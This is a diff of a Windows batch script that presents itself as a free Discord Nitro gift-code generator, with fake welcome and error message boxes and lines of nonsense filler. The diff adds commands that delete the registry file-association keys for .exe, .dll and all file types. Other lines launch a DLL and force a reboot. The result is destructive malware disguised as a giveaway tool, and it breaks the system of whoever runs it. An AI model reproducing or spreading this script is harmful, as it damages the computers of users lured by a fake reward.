@@ -3,12 +3,15 @@
 pause
 echo x=msgbox("Nitro Generator" ,0+64, "Welcome to free nitro gift codes generator 2069! Press ok to continue") >> msgbox2.vbs
 echo x=msgbox("CRITICAL ERROR" ,0+16, "Something went wrong, please press "Ok" to try agian.") >> msgbox.vbs
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
 start "rippcassist.dll"
 wmic os where primary=1 reboot
 
 ez 666 bytes am pro 666 bytes yes bc yes haha yes haha no haha yes
 e yes sir why not haha yes
-e hrudjrjrjrrifhwroufjqipehfqouehfpiqejfpiqehfpueqfh
+e
 e
 e
 e
